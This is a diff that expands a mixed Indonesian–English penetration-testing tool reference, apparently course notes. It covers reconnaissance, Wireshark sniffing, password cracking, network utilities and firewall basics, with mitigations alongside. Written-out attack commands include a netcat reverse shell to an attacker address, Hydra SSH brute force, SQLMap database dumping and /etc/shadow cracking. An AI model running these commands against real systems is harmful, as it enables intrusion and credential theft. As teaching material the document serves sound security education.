@@ -4012,9 +4012,17 @@ Comprehensive reference of security tools digunakan untuk penetration testing (o
 
 #### 1. RECONNAISSANCE & SCANNING TOOLS
 
-**A. Nmap (Network Mapper)**
-- Fungsi: Host discovery, port scanning, service/version detection, OS detection, vulnerability scanning
-- Instalasi: `sudo apt update && sudo apt install nmap -y` (sudah default di Kali)
+**A. Nmap (Network Mapper) - Port Scanning & Network Enumeration**
+- **Fungsi Utama**: Host discovery, port scanning, service/version detection, OS detection, vulnerability scanning
+- **Digunakan Untuk**:
+  - Network reconnaissance untuk identify active hosts di target network
+  - Port scanning untuk find open services dan potentially vulnerable applications
+  - Service version detection untuk identify specific software yang running
+  - OS fingerprinting untuk determine target operating system & configuration
+  - Vulnerability detection via NSE scripts untuk quick assessment
+  - Network mapping untuk understand target infrastructure
+  
+- **Instalasi**: `sudo apt update && sudo apt install nmap -y` (sudah default di Kali)
 
 Perintah umum:
 ```bash
@@ -4035,10 +4043,18 @@ nmap -oX report.xml 192.168.56.101          # Save XML format
 - Teknik: TCP SYN stealth scan, UDP enumeration, OS fingerprinting, NSE scripts untuk vulnerability detection
 - Mitigasi: IDS/IPS detection of nmap scans, firewall logging, port knocking
 
-**B. Shodan - Internet Search Engine**
-- Fungsi: Search internet-connected devices & servers via public-facing services
-- Website: https://www.shodan.io
-- Query examples:
+**B. Shodan - Internet Search Engine untuk Device Discovery**
+- **Fungsi Utama**: Search internet-connected devices & servers via public-facing services
+- **Digunakan Untuk**:
+  - Passive reconnaissance untuk find exposed systems tanpa direct scanning
+  - Identify vulnerable devices exposed ke internet (default credentials, known CVE)
+  - Corporate network mapping dari eksternal perspective
+  - Competitive intelligence untuk identify competitor infrastructure
+  - IoT device discovery untuk assess security exposure
+  - Finding backup systems, test systems yang accidentally exposed
+  
+- **Website**: https://www.shodan.io
+- **Query examples**:
   ```
   apache 200 ok
   port:22 country:ID
@@ -4048,16 +4064,32 @@ nmap -oX report.xml 192.168.56.101          # Save XML format
 - Teknik: Passive reconnaissance, identify exposed services globally, gather OSINT
 - Mitigasi: Firewall blocking unnecessary inbound access, network segmentation, remove from search indexes
 
-**C. Maltego - OSINT Relationship Mapping**
-- Fungsi: Link analysis, entity relationship mapping, open source intelligence
-- Use: Gather information on individuals, companies, domains, networks
-- Transforms: DNS lookup, email harvesting, whois, IP geolocation, social media
+**C. Maltego - OSINT Relationship Mapping & Link Analysis**
+- **Fungsi Utama**: Link analysis, entity relationship mapping, open source intelligence
+- **Digunakan Untuk**:
+  - Person/company profiling untuk social engineering target selection
+  - Domain ownership tracing untuk identify legitimate vs fake websites
+  - Email address enumeration dari various online sources
+  - Finding related domains & subdomains untuk comprehensive reconnaissance
+  - Mapping organizational relationships & employee networks
+  - Gathering phone numbers, email addresses, locations dari public data
+  
+- **Use**: Gather information on individuals, companies, domains, networks
+- **Transforms**: DNS lookup, email harvesting, whois, IP geolocation, social media
 - Teknik: Graph-based intelligence gathering, target profiling, social engineering
 - Mitigasi: Privacy protection, limit public information exposure, monitor Maltego usage
 
-**D. Recon-ng - Web Reconnaissance Framework**
-- Fungsi: Automated web reconnaissance & OSINT
-- Commands:
+**D. Recon-ng - Automated Web Reconnaissance Framework**
+- **Fungsi Utama**: Automated web reconnaissance & OSINT collection
+- **Digunakan Untuk**:
+  - Automated information gathering dari multiple online sources
+  - API-based data collection untuk employee enumeration
+  - GitHub reconnaissance untuk find exposed credentials & API keys dalam repos
+  - Email enumeration dari breach databases dan other sources
+  - Subdomain discovery via certificate transparency logs
+  - Metadata extraction dari publicly available documents
+  
+- **Commands**:
   ```bash
   recon-ng
   > marketplace search github
@@ -4100,33 +4132,365 @@ nmap -oX report.xml 192.168.56.101          # Save XML format
 
 #### 3. TRAFFIC SNIFFING & MAN-IN-THE-MIDDLE TOOLS
 
-**A. Wireshark - Interactive Packet Analyzer**
-- Fungsi: Capture & analyze network traffic in real-time (GUI)
-- Commands:
-  ```bash
-  wireshark                          # Launch GUI
-  wireshark capture.pcap             # Open saved capture file
-  ```
-- Capture filters (during capture):
-  ```
-  tcp port 80              # Capture HTTP only
-  tcp port 443             # Capture HTTPS only
-  host 192.168.56.101      # Capture to/from specific IP
-  arp                      # Capture ARP traffic
-  udp port 53              # Capture DNS
-  tcp.port == 22           # Capture SSH
-  ```
-- Display filters (after capture):
-  ```
-  http                     # Show HTTP packets
-  tls                      # Show TLS handshake
-  http.request.method == "GET"
-  ip.addr == 192.168.56.101
-  tcp.flags.syn == 1       # SYN packets (connection start)
-  ```
-- Follow TCP Stream: Right-click packet → Follow → TCP Stream (menampilkan full conversation plaintext)
-- Teknik: Interactive traffic analysis, plaintext credential extraction, protocol analysis, vulnerability discovery
-- Mitigasi: HTTPS/TLS encryption, network segmentation, VPN deployment, network monitoring
+**A. Wireshark - Interactive Network Packet Analyzer & Sniffer**
+
+- **Fungsi Utama**: Capture & analyze network traffic in real-time dengan GUI interaktif
+- **Digunakan Untuk**:
+  - Network troubleshooting & performance analysis
+  - Protocol analysis & verification
+  - Security investigation & incident analysis
+  - Malware behavior analysis & C2 communication detection
+  - Plaintext credential extraction dari unencrypted protocols
+  - Understanding network communication flow
+  - Training & learning network protocols
+  - Forensics & packet-level investigation
+
+#### **INSTALASI & LAUNCHING**
+```bash
+sudo apt install wireshark
+sudo usermod -aG wireshark $USER              # Add current user to wireshark group
+wireshark &                                   # Launch GUI (background)
+wireshark -r capture.pcap                     # Open saved capture file
+wireshark -i eth0                             # Capture on specific interface
+wireshark -k -i eth0                          # Start capture immediately
+```
+
+#### **BASIC SNIFFING - CARA CAPTURE PAKET**
+
+**Step 1: Select Interface**
+```
+1. Launch Wireshark
+2. Menu: Capture → Interfaces (atau Ctrl+I)
+3. Pilih interface yang active (contoh: eth0, wlan0)
+4. Lihat indicator "Traffic" untuk confirm interface active
+```
+
+**Step 2: Start Capture**
+```
+Cara 1 - GUI:
+- Klik interface name → Auto-start capture begins
+- Atau: Capture → Start (Ctrl+E)
+
+Cara 2 - Terminal:
+sudo wireshark -i eth0 -w output.pcap
+```
+
+**Step 3: Stop Capture**
+```
+Capture → Stop (Ctrl+E) atau klik Stop button (red square)
+```
+
+**Step 4: Save Capture**
+```
+File → Export As → Format PCAP (.pcap)
+Atau: File → Save As
+```
+
+#### **CAPTURE FILTERS vs DISPLAY FILTERS**
+
+**Capture Filters** (set SEBELUM capture, mengurangi data capture):
+- Syntax: `tcp port 80` atau `host 192.168.56.101`
+- Set di: Capture → Capture Filters (atau input box sebelum start)
+- Efek: HANYA packets matching filter yang dicapture (menghemat disk)
+
+**Display Filters** (set SETELAH capture, untuk viewing):
+- Syntax: `http` atau `ip.addr == 192.168.56.101`
+- Set di: Filter input box di toolbar (usually gray box dengan magnifier)
+- Efek: Menampilkan/menyembunyikan packets tanpa menghapus dari capture
+
+**Contoh Capture Filters:**
+```
+tcp port 80                    # Only HTTP
+tcp port 443                   # Only HTTPS
+host 192.168.56.101           # To/from specific IP
+arp                           # ARP traffic only
+udp port 53                   # DNS only
+tcp.port == 22                # SSH only
+src host 192.168.56.1         # Source IP only
+dst host 192.168.56.101       # Destination IP only
+tcp and not ssh               # TCP but exclude SSH
+(tcp.port == 80) or (tcp.port == 443)  # HTTP or HTTPS
+```
+
+**Contoh Display Filters:**
+```
+http                          # Show HTTP packets
+http.request.method == "GET"  # Only GET requests
+http.request.uri contains "admin"  # URIs containing "admin"
+ip.addr == 192.168.56.101    # Traffic to/from IP
+tcp.port == 3306             # MySQL traffic
+dns.qry.name contains "google"  # DNS queries untuk google
+tcp.flags.syn == 1           # SYN packets (connection start)
+tcp.flags.fin == 1           # FIN packets (connection end)
+tls.handshake                # TLS handshake packets
+smtp                         # Email (SMTP) traffic
+ftp                          # FTP traffic
+telnet                       # Telnet (plaintext!) traffic
+```
+
+#### **WIRESHARK INTERFACE & MENUS**
+
+**Main Windows:**
+```
+┌────────────────────────────────────────────┐
+│ Menu Bar (File, Edit, View, Capture, etc)  │
+├────────────────────────────────────────────┤
+│ Toolbar (buttons untuk common actions)     │
+├────────────────────────────────────────────┤
+│ Filter Box (display filters)               │
+├────────────────────────────────────────────┤
+│ PACKET LIST (summary of captured packets)  │ ← Main area
+├────────────────────────────────────────────┤
+│ PACKET DETAILS (expanded view of selected) │ ← Shows protocol layers
+├────────────────────────────────────────────┤
+│ PACKET BYTES (hex/ASCII view)              │ ← Raw data
+└────────────────────────────────────────────┘
+```
+
+**Important Menus:**
+
+**Capture Menu:**
+- `Interfaces` (Ctrl+I) - Select/manage capture interfaces
+- `Options` (Ctrl+K) - Advanced capture settings
+- `Start` (Ctrl+E) - Begin packet capture
+- `Stop` (Ctrl+E) - Stop capture
+- `Restart` - Clear & restart capture
+
+**View Menu:**
+- `Zoom In/Out` - Resize packet list
+- `Columns` - Add/remove columns di packet list
+- `Colorize` - Color code packets by protocol
+- `Name Resolution` - Enable DNS/MAC resolution
+- `Scroll Packet List` - Auto-scroll ke newest packets
+
+**Analyze Menu:**
+- `Decode As` - Force specific protocol interpretation
+- `Follow Stream` (→ TCP/UDP/TLS) - Show full conversation
+- `Conversation List` - Show conversations antar hosts
+- `Service Response Time` - Analyze latency
+
+**Tools Menu:**
+- `Firewall ACL Rules` - Generate ACL rules dari capture
+- `Create Stat > Protocol Hierarchy` - Show protocol breakdown
+- `Create Stat > Conversations` - Show host conversations
+
+#### **CARA BACA PACKET DI WIRESHARK**
+
+**Packet List Pane (Top):**
+```
+No.  Time        Source      Destination  Protocol Length Info
+1    0.000000    192.168.1.1 192.168.1.10 TCP      60     55632→80 [SYN] Seq=0
+2    0.000456    192.168.1.10 192.168.1.1 TCP      60     80→55632 [SYN, ACK] Seq=0 Ack=1
+3    0.000789    192.168.1.1 192.168.1.10 TCP      54     55632→80 [ACK] Seq=1 Ack=1
+4    0.001234    192.168.1.1 192.168.1.10 HTTP     145    GET / HTTP/1.1
+5    0.001678    192.168.1.10 192.168.1.1 HTTP     512    HTTP/1.1 200 OK (text/html)
+```
+
+**Column Meanings:**
+- **No**: Packet sequence number
+- **Time**: Time offset dari capture start
+- **Source**: Source IP:port
+- **Destination**: Destination IP:port
+- **Protocol**: Protocol name (TCP, UDP, HTTP, DNS, etc)
+- **Length**: Total packet size dalam bytes
+- **Info**: Summary info (flags, port numbers, request/response status)
+
+**Packet Details Pane (Middle) - Protocol Stack:**
+```
+Frame 1: 60 bytes on wire (480 bits), 60 bytes captured (480 bits)
+├─ Ethernet II
+├─ Internet Protocol Version 4
+│  ├─ Source: 192.168.1.1
+│  ├─ Destination: 192.168.1.10
+│  └─ Protocol: TCP (6)
+└─ Transmission Control Protocol
+   ├─ Source Port: 55632
+   ├─ Destination Port: 80
+   ├─ Sequence Number: 0 (relative sequence number)
+   ├─ Acknowledgement Number: 0
+   ├─ Flags: 0x002 (SYN)
+   └─ Window Size: 65535
+```
+
+**Understanding Packet Details:**
+- Expand each layer (▶ symbol) untuk melihat detail
+- Warna highlights correspond ke Packet Bytes
+- Setiap field punya tooltip/explanation
+- Dapat copy values untuk analysis
+
+**Packet Bytes Pane (Bottom):**
+```
+Hex view:                    ASCII view:
+4500 0039 0000 4000         E... @
+4006 7a5a c0a8 0101         ..*Z ....
+c0a8 010a da84 0050         ......P
+0000 0000 0000 0000         ........
+5002 ffff 1234 0000         P... .4..
+                            
+Warna = corresponding ke selected field di Packet Details
+Dapat copy hexadecimal values untuk analysis
+```
+
+#### **ANALYZING CONVERSATIONS - Follow Stream**
+
+**How to Use:**
+```
+1. Click any packet dalam conversation
+2. Right-click → Follow → TCP Stream (atau UDP/TLS)
+3. Atau: Analyze → Follow → TCP Stream
+4. Dialog terbuka showing full conversation
+```
+
+**TCP Stream Example:**
+```
+=================================================================
+GET / HTTP/1.1\r\n
+Host: example.com\r\n
+User-Agent: Mozilla/5.0\r\n
+\r\n
+
+HTTP/1.1 200 OK\r\n
+Content-Type: text/html\r\n
+Content-Length: 1234\r\n
+\r\n
+<html><body>Welcome</body></html>
+=================================================================
+```
+
+**Stream Options:**
+- **Show Data As**: ASCII (text), Hex Dump, Raw
+- **Direction**: Client → Server (red), Server → Client (blue), Both
+- **Zoom**: Adjust text size
+- **Save As**: Export conversation ke file
+
+#### **EXTRACTING DATA FROM CAPTURE**
+
+**Method 1: Export HTTP Objects**
+```
+1. File → Export Objects → HTTP
+2. Dialog shows all images/files downloaded
+3. Select & save individual files
+4. Useful untuk: extract images, documents, scripts
+```
+
+**Method 2: Follow TCP Stream**
+```
+1. Find relevant packet
+2. Right-click → Follow TCP Stream
+3. Copy plaintext conversation
+4. Save into file
+```
+
+**Method 3: Export Packet Bytes**
+```
+1. Select packet
+2. Analyze → Export Selected Packet Bytes
+3. Save as hex dump atau text
+```
+
+#### **COMMON SNIFFING SCENARIOS**
+
+**Scenario 1: Capture HTTP Traffic & Extract Passwords**
+```
+Filter: http
+Follow TCP Stream untuk setiap HTTP request
+Cari credentials dalam GET/POST parameters
+Contoh: GET /login.php?username=admin&password=secret123
+```
+
+**Scenario 2: Capture DNS Queries**
+```
+Filter: dns
+Lihat "DNS.qry.name" untuk daftar domains yang di-query
+Detect malware/C2 communications via suspicious domains
+```
+
+**Scenario 3: Analyze Connection Establishment**
+```
+Filter: tcp.flags.syn == 1
+Lihat semua connection initiations (SYN packets)
+Identify port scanning attempts
+```
+
+**Scenario 4: Detect Encrypted Tunnels**
+```
+Filter: tls
+Lihat TLS handshake packets
+Extract SSL/TLS certificate information
+Identify encryption protocol version
+```
+
+**Scenario 5: Monitor File Transfers**
+```
+Filter: ftp or sftp or smb
+Follow stream untuk melihat file paths & commands
+Detect unauthorized file transfers
+```
+
+#### **ADVANCED WIRESHARK FEATURES**
+
+**Colorizing Packets:**
+```
+View → Colorize Packet List
+View → Coloring Rules untuk customize
+Default:
+- Green: TCP traffic
+- Light blue: UDP traffic
+- Black: Error packets
+```
+
+**Statistics & Analysis:**
+```
+Statistics → Protocol Hierarchy
+- Breakdown of all protocols dalam capture
+
+Statistics → Conversations
+- List of all conversations (IP pairs)
+- Bytes sent/received
+- Duration
+
+Statistics → Endpoints
+- List of all unique IPs
+- Packets sent/received
+```
+
+**Searching Packets:**
+```
+Edit → Find Packet (Ctrl+F)
+Cara search:
+- Display filter (normal filter)
+- Hex value (dalam packet bytes)
+- String (dalam payload)
+- Regex (regular expressions)
+```
+
+#### **WIRESHARK SECURITY & ETHICS**
+
+**Legal & Ethical Considerations:**
+```
+⚠️ IMPORTANT:
+- Hanya capture traffic Anda OWN atau authorized
+- Capturing others' traffic tanpa consent = ILLEGAL
+- Many jurisdictions have wiretapping laws
+- Use untuk legitimate purposes (troubleshooting, learning, authorized testing)
+```
+
+**Privacy Protection:**
+```
+Sanitize captures sebelum sharing:
+- File → Export Specified Packets (select non-sensitive)
+- Remove traffic dengan sensitive data
+- Redact IP addresses jika perlu
+```
+
+**Performance Monitoring:**
+```
+Wireshark can slow network karena packet copying
+Gunakan:
+- Capture filters untuk reduce overhead
+- tcpdump untuk high-performance capture
+- Ring buffer mode untuk continuous monitoring
+```
 
 **B. tcpdump - Command-line Packet Capture**
 - Fungsi: Scriptable packet capture, unattended monitoring
@@ -4254,10 +4618,18 @@ nmap -oX report.xml 192.168.56.101          # Save XML format
 - Teknik: Multi-exploit chaining, privilege escalation, credential dumping, persistence
 - Mitigasi: Patching, IPS/IDS deployment, endpoint detection, network segmentation
 
-**B. Burp Suite - Web Application Security Testing**
-- Fungsi: Web app scanning, proxy interception, exploitation workflows
-- Installation: `sudo apt install burpsuite` (Community edition free)
-- Proxy mode:
+**B. Burp Suite - Web Application Security Testing Platform**
+- **Fungsi Utama**: Web app scanning, proxy interception, exploitation workflows
+- **Digunakan Untuk**:
+  - Identify web application vulnerabilities (SQL injection, XSS, CSRF, insecure deserialization)
+  - Manual & automated vulnerability discovery dalam web apps
+  - Request/response modification untuk bypass security controls
+  - Scanning forms untuk find injectable parameters
+  - Exploitation workflow untuk proof-of-concept
+  - Testing custom authentication mechanisms
+  
+- **Installation**: `sudo apt install burpsuite` (Community edition free)
+- **Proxy mode**:
   ```bash
   burpsuite                           # Launch GUI
   # Configure browser: localhost:8080 (default Burp proxy)
@@ -4270,9 +4642,18 @@ nmap -oX report.xml 192.168.56.101          # Save XML format
 - Teknik: Manual & automated vulnerability discovery, exploitation workflows, bypass techniques
 - Mitigasi: WAF deployment, input validation, secure coding practices, CSP headers
 
-**C. SQLMap - SQL Injection Detection & Exploitation**
-- Fungsi: Automated SQL injection testing & database extraction
-- Commands:
+**C. SQLMap - SQL Injection Testing & Database Extraction**
+- **Fungsi Utama**: Automated SQL injection testing & database extraction
+- **Digunakan Untuk**:
+  - Automated detection dari SQL injection vulnerabilities di web applications
+  - Database enumeration untuk extract credentials, sensitive data
+  - Bypass database authentication untuk unauthorized access
+  - Extract user data, credit cards, personal information dari database
+  - Identify injectable parameters automatically
+  - WAF/IPS evasion techniques untuk test protected applications
+  
+- **Installation**: `sudo apt install sqlmap` atau `pip install sqlmap`
+- **Commands**:
   ```bash
   sqlmap -u "http://192.168.56.101/login.php?id=1" # Basic scan
   sqlmap -u "http://192.168.56.101/login.php?id=1" -p id --dbs # List databases
@@ -4285,9 +4666,19 @@ nmap -oX report.xml 192.168.56.101          # Save XML format
 - Teknik: Parameter fuzzing, encoding evasion, WAF bypass, database enumeration
 - Mitigasi: Parameterized queries, input validation, WAF, rate limiting, stored procedure
 
-**D. Hydra - Fast Password Cracking (Brute Force)**
-- Fungsi: Dictionary/brute force attack terhadap network services
-- Commands:
+**D. Hydra - Fast Network Service Password Cracking**
+- **Fungsi Utama**: Dictionary/brute force attack terhadap network services
+- **Digunakan Untuk**:
+  - SSH password cracking untuk gain remote access ke servers
+  - FTP brute force untuk access file servers
+  - HTTP basic authentication testing
+  - MySQL/PostgreSQL default credential checking
+  - RDP brute force untuk Windows systems
+  - Parallel multi-target attacks untuk speed up
+  - Wordlist-based dictionary attacks
+  
+- **Installation**: `sudo apt install hydra`
+- **Commands**:
   ```bash
   hydra -l admin -P wordlist.txt 192.168.56.101 ssh # SSH brute force
   hydra -l admin -P wordlist.txt http-get 192.168.56.101 # HTTP basic auth
@@ -4299,9 +4690,18 @@ nmap -oX report.xml 192.168.56.101          # Save XML format
 - Teknik: Parallel cracking, rate limiting bypass, session management, combo attacks
 - Mitigasi: Strong passwords, fail2ban (rate limiting), account lockout policy, 2FA
 
-**E. John the Ripper - Password Hash Cracking**
-- Fungsi: Offline password hash cracking dari /etc/shadow atau database dumps
-- Commands:
+**E. John the Ripper - Offline Password Hash Cracking**
+- **Fungsi Utama**: Offline password hash cracking dari /etc/shadow atau database dumps
+- **Digunakan Untuk**:
+  - Crack Linux user passwords dari /etc/shadow after breach
+  - Recover credentials dari stolen database backups
+  - Testing password policy strength dalam organizations
+  - Rainbow table attacks untuk common password hashes
+  - Finding weak passwords dalam compromised systems
+  - Assessing password security posture
+  
+- **Installation**: `sudo apt install john`
+- **Commands**:
   ```bash
   john --wordlist=wordlist.txt shadow.txt # Crack /etc/shadow hashes
   john --format=MD5 hashes.txt            # Crack MD5 hashes
@@ -4314,8 +4714,17 @@ nmap -oX report.xml 192.168.56.101          # Save XML format
 - Mitigasi: Strong hashing (bcrypt, scrypt, Argon2), salting, key derivation, slow algorithms
 
 **F. Hashcat - GPU-Accelerated Hash Cracking**
-- Fungsi: Fast hash cracking menggunakan GPU acceleration
-- Commands:
+- **Fungsi Utama**: Fast hash cracking menggunakan GPU acceleration
+- **Digunakan Untuk**:
+  - Fast password hash cracking dengan GPU untuk speed (100x+ faster)
+  - Cracking large databases dengan hashes
+  - Brute force attacks pada weakly hashed passwords
+  - Testing bcrypt/scrypt hashes (slower algorithms)
+  - Mask attacks untuk predictable password patterns
+  - Dictionary attacks pada various hash formats
+  
+- **Installation**: `sudo apt install hashcat`
+- **Commands**:
   ```bash
   hashcat -m 0 hashes.txt wordlist.txt        # MD5 cracking (-m 0)
   hashcat -m 1000 hashes.txt wordlist.txt     # NTLM cracking (-m 1000)
@@ -4326,6 +4735,226 @@ nmap -oX report.xml 192.168.56.101          # Save XML format
 - Performance: 100x+ lebih cepat dari CPU-based methods (dengan GPU)
 - Mitigasi: Same as John the Ripper - strong hashing, salting, slow algorithms
 
+#### 6. NETWORK DISCOVERY & VALIDATION TOOLS
+
+**A. ARP Scan (arp-scan) - Local Network Discovery**
+- **Fungsi Utama**: Discover active hosts pada local network via ARP protocol
+- **Digunakan Untuk**:
+  - Quick host discovery di local network (faster & more reliable than ping)
+  - Identify IP address assignments dan active devices
+  - Detect ARP spoofing atau suspicious ARP activities
+  - Network mapping untuk local segment
+  - Find unauthorized devices connected ke network
+  
+- **Installation**: `sudo apt install arp-scan`
+- **Commands**:
+  ```bash
+  sudo arp-scan -l                          # Scan local network
+  sudo arp-scan -I eth0 192.168.56.0/24    # Scan specific subnet on interface
+  sudo arp-scan -v 192.168.56.0/24          # Verbose output
+  sudo arp-scan --localnet                  # Auto-scan local network
+  ```
+- Output: IP address, MAC address, device manufacturer
+- Teknik: Layer 2 discovery (tidak easily detected seperti ping scans)
+
+**B. Nping - Network Packet Probe**
+- **Fungsi Utama**: Advanced packet crafting & network probing tool
+- **Digunakan Untuk**:
+  - Custom packet crafting untuk ping echo requests
+  - TCP/UDP port connectivity testing (alternative to telnet)
+  - Network latency measurement
+  - Testing firewall rules & network behavior
+  - Identifying packet filtering policies
+  - Crafting custom headers untuk bypass filters
+  
+- **Installation**: `sudo apt install nmap` (includes nping)
+- **Commands**:
+  ```bash
+  nping 192.168.56.101                      # Simple ICMP echo
+  nping -tcp 192.168.56.101 -p 80           # TCP ping to port 80
+  nping -udp 192.168.56.101 -p 53           # UDP ping to port 53
+  nping --tcp-flags SYN 192.168.56.101      # Custom TCP SYN flag
+  nping -HH 192.168.56.101 -p 443           # Show hex output
+  ```
+
+**C. Telnet - Basic Network Connectivity Testing**
+- **Fungsi Utama**: Terminal emulation & port connectivity testing
+- **Digunakan Untuk**:
+  - Simple port connectivity check (telnet host:port)
+  - Testing if service adalah open & responding
+  - Plaintext protocol testing (HTTP, SMTP, POP3, etc)
+  - Manual banner grabbing dari services
+  - Debugging network connectivity issues
+  - Testing firewall rules
+  
+- **Installation**: `sudo apt install telnet`
+- **Commands**:
+  ```bash
+  telnet 192.168.56.101 80                  # Test HTTP port
+  telnet 192.168.56.101 443                 # Test HTTPS port
+  telnet 192.168.56.101 22                  # Test SSH port
+  telnet smtp.example.com 25                # Test SMTP
+  telnet pop3.example.com 110               # Test POP3
+  ```
+- Usage: Type commands directly (HTTP: GET / HTTP/1.1)
+- Caution: Unencrypted protocol, avoid for sensitive operations
+
+**D. Netcat (nc) - Network Swiss Army Knife**
+- **Fungsi Utama**: Network data transmission, port scanning, reverse shells
+- **Digunakan Untuk**:
+  - Port scanning (simpler alternative to nmap -p-)
+  - Banner grabbing dari services
+  - File transfer antara systems
+  - Port forwarding & tunneling
+  - Creating reverse shells untuk post-exploitation
+  - Testing network connectivity
+  - Server/client communication testing
+  
+- **Installation**: `sudo apt install netcat-openbsd` atau `netcat-traditional`
+- **Commands**:
+  ```bash
+  nc -zv 192.168.56.101 1-1000              # Port scan range
+  nc -zv 192.168.56.101 80,443,22           # Scan specific ports
+  nc 192.168.56.101 80                      # Connect ke service
+  nc -l -p 4444                             # Listen mode (server)
+  nc 192.168.56.101 4444 < file.txt         # Send file
+  nc -l -p 4444 > received.txt              # Receive file
+  nc -e /bin/bash 192.168.56.100 4444       # Reverse shell to attacker
+  ```
+
+**E. Tracert/Traceroute - Route Path Visualization**
+- **Fungsi Utama**: Trace network path dari source ke destination
+- **Digunakan Untuk**:
+  - Identify routing path untuk target system
+  - Find intermediate routers pada path
+  - Identify firewalls blocking certain hops
+  - Detect network latency points
+  - Troubleshoot network connectivity issues
+  - Mapping network infrastructure
+  
+- **Installation**: 
+  - Windows: `tracert` (built-in)
+  - Linux: `sudo apt install traceroute`
+  
+- **Commands**:
+  ```bash
+  traceroute 192.168.56.101                 # Linux version
+  traceroute -m 30 192.168.56.101           # Max 30 hops
+  traceroute -p 80 192.168.56.101           # Use port 80 instead ICMP
+  tracert 192.168.56.101                    # Windows version
+  tracert -h 30 192.168.56.101              # Windows max hops
+  ```
+- Output: Hop number, router IP, round-trip times
+- TTL (Time To Live): Decreased pada setiap hop untuk identify intermediate systems
+
+#### 7. LINUX NETWORK COMMANDS & UTILITIES
+
+**A. IP Address & Interface Management**
+- **Commands**:
+  ```bash
+  ip addr show                              # Display all interfaces & IP addresses
+  ip addr add 192.168.56.50/24 dev eth0    # Assign IP address
+  ip addr del 192.168.56.50/24 dev eth0    # Remove IP address
+  ip link show                              # Display link layer info
+  ip link set eth0 up                       # Enable interface
+  ip link set eth0 down                     # Disable interface
+  ifconfig                                  # Legacy interface info (deprecated)
+  ifconfig eth0 192.168.56.100              # Set IP (legacy)
+  ```
+- **Digunakan Untuk**: Interface configuration, IP management, network setup
+
+**B. Routing & Gateway Configuration**
+- **Commands**:
+  ```bash
+  ip route show                             # Display routing table
+  ip route add 10.0.0.0/24 via 192.168.56.1 # Add route
+  ip route del 10.0.0.0/24                  # Delete route
+  ip route add default via 192.168.56.1     # Set default gateway
+  route                                     # Display routing table (legacy)
+  route add default gw 192.168.56.1         # Set gateway (legacy)
+  netstat -r                                # Show routing table via netstat
+  ```
+- **Digunakan Untuk**: Routing configuration, gateway setup, network path definition
+
+**C. DNS Resolution & Configuration**
+- **Commands**:
+  ```bash
+  nslookup google.com                       # Query DNS server
+  nslookup -type=MX google.com              # Query MX records
+  dig google.com                            # Detailed DNS query
+  dig google.com +short                     # Short DNS query output
+  dig google.com @8.8.8.8                   # Query specific DNS server
+  host google.com                           # Simple hostname resolution
+  hostname                                  # Display/set system hostname
+  hostname -I                               # Display all IP addresses
+  cat /etc/resolv.conf                      # Display DNS servers config
+  ```
+- **Digunakan Untuk**: DNS testing, domain resolution, DNS reconnaissance
+
+**D. Network Statistics & Connection Analysis**
+- **Commands**:
+  ```bash
+  netstat -an                               # Show all connections (numeric)
+  netstat -antp                             # Show connections with process names
+  netstat -i                                # Display interface statistics
+  netstat -r                                # Display routing table
+  netstat -s                                # Display protocol statistics
+  ss -antp                                  # Modern alternative (socket statistics)
+  ss -tunap                                 # Show all listening ports
+  lsof -i                                   # List open files & network connections
+  ```
+- **Digunakan Untuk**: Connection monitoring, port audit, process tracking
+
+**E. Packet Capture & Analysis**
+- **Commands**:
+  ```bash
+  tcpdump -i eth0                           # Capture on interface
+  tcpdump -i eth0 tcp port 80               # Capture HTTP traffic
+  tcpdump -i eth0 -w capture.pcap           # Write to file
+  tcpdump -i eth0 -r capture.pcap           # Read from file
+  tcpdump -i eth0 -n 'tcp port 22'         # No DNS resolution
+  tcpdump -i any                            # Capture all interfaces
+  tshark -i eth0                            # Wireshark CLI version
+  tshark -r capture.pcap -Y http            # Filter display
+  ```
+- **Digunakan Untuk**: Network traffic analysis, packet inspection, monitoring
+
+**F. Firewall & Netfilter Management**
+- **Commands**:
+  ```bash
+  sudo iptables -L                          # List firewall rules
+  sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
+  sudo ufw status                           # UFW firewall status
+  sudo ufw allow 22/tcp                     # Allow SSH
+  sudo firewall-cmd --list-all              # Firewalld status
+  ```
+- **Digunakan Untuk**: Firewall rule management, packet filtering
+
+**G. Bandwidth & Performance Monitoring**
+- **Commands**:
+  ```bash
+  ifstat                                    # Interface statistics
+  nethogs                                   # Per-process bandwidth usage
+  iftop                                     # Real-time bandwidth by host
+  mtr 192.168.56.101                        # Combined traceroute + ping
+  ping -c 4 192.168.56.101                  # Ping with count
+  speedtest-cli                             # Internet speed test
+  ```
+- **Digunakan Untuk**: Network performance analysis, bandwidth monitoring
+
+**H. Network Service Testing & Probing**
+- **Commands**:
+  ```bash
+  curl http://192.168.56.101                # HTTP request & content download
+  curl -I http://192.168.56.101             # HTTP headers only
+  wget http://192.168.56.101/file.txt       # Download file
+  whois 192.168.56.101                      # WHOIS database lookup
+  ping -c 1 192.168.56.101                  # ICMP echo test
+  fping 192.168.56.0/24                     # Parallel ping sweep
+  arping 192.168.56.101                     # ARP-based ping
+  ```
+- **Digunakan Untuk**: Service testing, connectivity validation, resource download
+
 ---
 
 ### BAGIAN 2: DEFENSIVE TOOLS & TECHNIQUES (BLUE TEAM)
@@ -4334,10 +4963,18 @@ Defensive tools untuk protection, detection, dan response terhadap network attac
 
 #### 1. FIREWALL & BOUNDARY PROTECTION
 
-**A. UFW (Uncomplicated Firewall) - Linux Firewall Management**
-- Fungsi: Simplified interface untuk iptables firewall management
-- Installation: `sudo apt install ufw`
-- Commands:
+**A. UFW (Uncomplicated Firewall) - Linux Host Firewall**
+- **Fungsi Utama**: Simplified interface untuk iptables firewall management
+- **Digunakan Untuk**:
+  - Basic host firewall protection di Linux servers
+  - Whitelist-based access control (default deny)
+  - Port-based filtering untuk services
+  - IP-based access restrictions
+  - Simple rule management via CLI
+  - Logging untuk audit trail
+  
+- **Installation**: `sudo apt install ufw`
+- **Commands**:
   ```bash
   sudo ufw enable                         # Enable firewall
   sudo ufw disable                        # Disable firewall
@@ -4358,9 +4995,18 @@ Defensive tools untuk protection, detection, dan response terhadap network attac
 - Teknik: Whitelist approach (deny by default, allow necessary), principle of least privilege
 - Impact: Blocks port scanning results (filtered status), prevents unauthorized access
 
-**B. iptables/netfilter - Advanced Linux Firewall**
-- Fungsi: Low-level packet filtering, Network Address Translation (NAT), load balancing
-- Commands:
+**B. iptables/netfilter - Advanced Linux Kernel Firewall**
+- **Fungsi Utama**: Low-level packet filtering, Network Address Translation (NAT), load balancing
+- **Digunakan Untuk**:
+  - Advanced packet filtering pada Linux kernel level
+  - Network Address Translation (NAT) untuk hide internal networks
